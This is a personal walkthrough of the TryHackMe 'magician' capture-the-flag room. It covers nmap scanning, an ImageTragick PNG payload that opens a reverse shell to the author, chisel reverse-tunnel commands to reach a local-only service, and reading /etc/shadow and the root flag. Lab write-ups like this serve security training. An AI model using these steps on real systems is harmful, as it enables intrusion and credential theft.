---
parent: "[[CTFs - THM]]"
resources:
---

```bash
# PLATFORM          . THM
# CTF NAME          . magician
# DESCRIPTION       . This magical website lets you convert image file formats
# DIFFICULTY        . easy
# CTF LINK          . https://tryhackme.com/r/room/magician
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.231.21 -oN magician
```

```
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 2.0.8 or later
8080/tcp open  http-proxy syn-ack ttl 63
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Tue, 19 Mar 2024 16:43:03 GMT
|     Connection: close
|     {"timestamp":"2024-03-19T16:43:04.475+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Tue, 19 Mar 2024 16:43:03 GMT
|     Connection: close
|     {"timestamp":"2024-03-19T16:43:03.889+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   HTTPOptions:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Tue, 19 Mar 2024 16:43:03 GMT
|     Connection: close
|     {"timestamp":"2024-03-19T16:43:04.205+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Tue, 19 Mar 2024 16:43:03 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: Site doesn't have a title (application/json).
8081/tcp open  http       syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: magician
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

## PORT 21 

- I tried connecting with `anonymous:anonymous` ; at first, I hit CTRL+C since it took to long but I was thinking that maybe the network was slower so I've decided to try again until I would get an eventual timed out error.

```
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.

ftp> ls -lah
550 Permission denied.
```

- Alright. This was unexpected. 

- The [link](https://imagetragick.com/) is disclosing CVE-2016-3714 where one of the vulnerabilites present in that version of ImageMagick leads to RCE.

- My attention was taken by CVE number 4 and 5 (2016-3716 and 2016-3717). They allowed for file moving and local file read, respectively.

- After analyzing the PoCs for a while, I came with the conclusion that there should / could be some way of making ImageMagick execute commands.

- Then, I started googling around and stumbled across PayloadsAllTheThings(again... they really have all the things there :D )

- To be more specific, [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20ImageMagick/imagetragik1_payload_imageover_reverse_shell_netcat_fifo.png) example. We can have a '.png' file that will try to initiate a connection to a listening IP of our choice.

- So I've used this in a file called `payload.png` and replaced the example file and IP with `/tmp/f` and my own IP.

```
Listening on 0.0.0.0 5555
Connection received on 10.10.231.21 36312
ls
985
uploads
```

- After stabilizing the shell, I took a look around and found the first flag in `/home/magician/user.txt`. It was readable.

- Also, there's a file called `the_magic_continues`.

```
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

- So I've decided to take a look at listening ports.

```
magician@magician:~$ ss -tulpn
Netid State   Recv-Q  Send-Q          Local Address:Port     Peer Address:Port
udp   UNCONN  0       0               127.0.0.53%lo:53            0.0.0.0:*
udp   UNCONN  0       0           10.10.231.21%eth0:68            0.0.0.0:*
tcp   LISTEN  0       128                   0.0.0.0:8081          0.0.0.0:*
tcp   LISTEN  0       128             127.0.0.53%lo:53            0.0.0.0:*
tcp   LISTEN  0       128                 127.0.0.1:6666          0.0.0.0:*
tcp   LISTEN  0       100                         *:8080                *:*      users:(("java",pid=985,fd=25))
tcp   LISTEN  0       32                          *:21                  *:*
```

- Ports 6666 seems to be what we're looking for. 

- I've used chisel to port-forward since SSH wasn't available, `net.ipv4.ip_forward` was set to 0 and we couldn't restart nginx service to add a new entry. 

```bash
#attacker
/chisel server --reverse --port 7777
2024/03/20 00:29:59 server: Reverse tunnelling enabled
2024/03/20 00:29:59 server: Fingerprint kxO0fdn2bOS9IORXR0wnF4L1kzgZp7oTe/DG88nTAHg=
2024/03/20 00:29:59 server: Listening on http://0.0.0.0:7777
2024/03/20 00:30:08 server: session#1: tun: proxy#R:9002=>6666: Listening
```

```bash
#victim ; local app running on port 6666
./chisel client attacker:7777 R:9002:127.0.0.1:6666
2024/03/19 18:30:08 client: Connecting to ws://attacker:7777
2024/03/19 18:30:08 client: Connected (Latency 56.903598ms)
```

- I've accessed the website by navigating to `localhost:9002`. I was asked to enter a file.

- I've entered `/etc/shadow` and I got the output as binary. Then, I clicked on submit some more times and I've noticed that the encodoing is changing.

- Anyway, I've decided not to pursue password cracking and to read the `/root/root.txt` flag directly.

